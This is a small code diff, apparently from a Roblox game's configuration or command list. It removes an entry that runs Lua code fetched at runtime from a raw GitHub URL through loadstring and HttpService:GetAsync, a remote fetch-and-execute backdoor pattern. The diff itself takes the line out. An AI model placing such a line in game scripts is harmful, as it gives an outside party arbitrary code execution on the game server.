@@ -33,5 +33,4 @@
 244903894:[[
   "nok"
   "antikill"
-  "s loadstring(game:GetService('HttpService'):GetAsync('https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/VecxoRemoteAPI'))()"
 ]]
